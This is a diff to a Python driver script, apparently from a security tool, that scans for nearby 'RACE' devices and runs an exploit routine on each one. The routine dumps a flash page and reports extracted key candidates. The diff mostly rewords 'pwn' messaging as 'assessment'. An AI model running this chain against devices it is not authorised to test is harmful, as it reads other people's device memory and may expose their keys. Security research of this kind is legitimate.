@@ -1,27 +1,59 @@
-import asyncio
+"""Find RACE devices and run the read-only assessment chain.
+
+The previous wording ("OWNED!") overstated what the code proves.  A successful
+``dump`` means build/address reads and one flash page read completed; the
+extracted bytes are unvalidated candidates, not a demonstrated impersonation.
+"""
+
+from __future__ import annotations
+
+from collections.abc import Callable
+from typing import Any
+
 from modules.discovery import aggressive_scan
 from modules.exploit import auto_exploit
-from colorama import Fore, Style
+from utils.config import RACEConfig
 
-async def hunt_and_pwn(timeout: int = 20):
-    """Automatically find and exploit RACE devices"""
-    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
-    print(f"{Fore.RED}  AUTO-HUNTER: Finding and pwning RACE devices{Style.RESET_ALL}")
-    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
-    
-    devices = await aggressive_scan(timeout)
-    
+
+async def hunt_and_pwn(
+    config: RACEConfig,
+    timeout: int = 20,
+    *,
+    scanner: Any | None = None,
+    client_factory: Callable[[str], Any] | None = None,
+) -> None:
+    """Find RACE devices and assess each one with ``action="dump"``."""
+    print("=" * 60)
+    print("  AUTO-HUNTER: Finding and assessing RACE devices")
+    print("=" * 60)
+
+    devices = await aggressive_scan(
+        config,
+        timeout,
+        scanner=scanner,
+        client_factory=client_factory,
+    )
+
     if not devices:
-        print(f"{Fore.RED}[-] No RACE devices found{Style.RESET_ALL}")
+        print("[-] No RACE devices found")
         return
-    
-    print(f"{Fore.GREEN}[+] Found {len(devices)} RACE device(s){Style.RESET_ALL}")
-    
+
+    print(f"[+] Found {len(devices)} RACE device(s)")
+
     for dev in devices:
-        print(f"\n{Fore.YELLOW}[*] Exploiting {dev['address']}...{Style.RESET_ALL}")
-        result = await auto_exploit(dev['address'], "dump")
-        
-        if result['status'] == 'success':
-            print(f"{Fore.GREEN}[+] {dev['address']} OWNED!{Style.RESET_ALL}")
+        print(f"\n[*] Assessing {dev['address']}...")
+        result = await auto_exploit(
+            dev["address"],
+            "dump",
+            config,
+            client_factory=client_factory,
+        )
+
+        if result["status"] == "success":
+            candidates = result.get("key_candidates") or []
+            print(
+                f"[+] {dev['address']} flash read succeeded; "
+                f"{len(candidates)} unvalidated key candidate(s)"
+            )
         else:
-            print(f"{Fore.RED}[-] {dev['address']} failed: {result.get('message', '')}{Style.RESET_ALL}")
+            print(f"[-] {dev['address']} failed: {result.get('message', '')}")
